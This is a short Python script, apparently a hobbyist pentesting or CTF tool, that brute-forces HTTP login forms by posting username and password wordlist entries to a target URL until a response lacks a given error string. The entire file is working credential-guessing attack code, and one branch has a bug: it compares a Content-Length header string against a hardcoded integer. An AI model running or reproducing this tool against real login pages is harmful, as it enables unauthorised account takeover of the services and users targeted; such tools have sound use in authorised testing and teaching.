import requests

def http_bruteforce(target, ulabel, plabel, userfile, passfile, error, user=None, password=None):

    # If we already know the username then only fuzz for password
    try:
        if passfile and user:

            with open(passfile, 'r') as f:
                passwords = f.readlines()

            for password in passwords:
                password = password.strip()
                response = requests.post(target, data={ulabel:user, plabel:password})

                if response.status_code == 200 and error not in response.text:
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break
                else:
                    print(f'\033[91m [-]\033[0m {user} : ', password)


        elif password and userfile:

            with open(userfile, 'r', encoding='latin-1') as f:
                username = f.readlines()
                
            for user in username:
                user = user.strip()
                print(user,password)
                response = requests.post(target, data={ulabel:user, plabel:password})
                print(response.headers['Content-Length'])

                if response.status_code == 200 and response.headers['Content-Length']!=329:
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break
                else:
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        # If we don't know the username then fuzz for both username and password
        elif userfile and passfile:
            with open(userfile, 'r') as f:
                users = f.readlines()
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    response = requests.post(target, data={ulabel:user, plabel:password})
                
                    
                    if response.status_code == 200 and error not in response.text:
                        print(f'\033[92m [+]\033[0m {user} : ', password)
                        break
                    else:
                        print(f'\033[91m [-]\033[0m {user} : ', password)
        
        else: 
            print('\033[91m [-]\033[0m Please provide both username and password files')
            exit(1)

    except KeyboardInterrupt:
        print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
        exit(1)
